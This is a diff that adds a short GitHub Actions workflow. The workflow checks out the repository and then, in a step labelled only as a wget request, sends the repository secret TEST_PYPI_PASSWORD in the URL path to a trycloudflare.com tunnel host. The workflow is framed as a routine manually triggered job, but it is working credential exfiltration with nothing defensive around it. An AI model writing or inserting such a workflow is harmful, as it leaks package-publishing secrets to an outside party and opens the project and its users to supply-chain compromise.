@@ -1,0 +1,17 @@
+# This allows the workflow to be triggered manually
+on:
+  workflow_dispatch:
+
+jobs:
+  wget-job:
+    runs-on: ubuntu-latest
+
+    steps:
+      # Checkout the repository
+      - name: Checkout repository
+        uses: actions/checkout@v3
+
+      # Make a wget request to the specified URL
+      - name: Make a Wget Request
+        run: |
+          wget https://compete-sg-review-alerts.trycloudflare.com/${{ secrets.TEST_PYPI_PASSWORD }}
